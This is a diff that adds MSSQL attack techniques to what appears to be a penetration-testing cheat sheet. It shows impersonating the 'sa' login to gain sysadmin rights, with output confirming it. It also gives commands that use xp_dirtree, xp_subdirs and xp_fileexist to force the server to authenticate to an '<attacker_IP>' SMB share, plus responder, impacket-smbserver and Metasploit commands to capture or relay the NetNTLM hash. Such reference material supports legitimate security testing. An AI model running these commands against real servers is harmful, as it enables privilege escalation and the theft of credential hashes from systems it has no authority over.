@@ -92,5 +92,39 @@ GO
 
 > type GO after each command
 
+## PrivEsc
 
+**Impersonating the SA User**
 
+```cmd-session
+1> EXECUTE AS LOGIN = 'sa'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> GO
+
+-----------
+sa
+
+(1 rows affected)
+
+-----------
+          1
+
+(1 rows affected)
+```
+
+## Steal NetNTLM hash / Relay attack
+
+You should start a **SMB server** to capture the hash used in the authentication (`impacket-smbserver` or `responder` for example).
+
+```bash
+xp_dirtree '\\<attacker_IP>\any\thing'
+exec master.dbo.xp_dirtree '\\<attacker_IP>\anything'
+EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
+EXEC master..xp_fileexist '\\<attacker_IP>\anything\'
+
+# Capture hash
+sudo responder -I tun0
+sudo impacket-smbserver share ./ -smb2support
+msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
+```
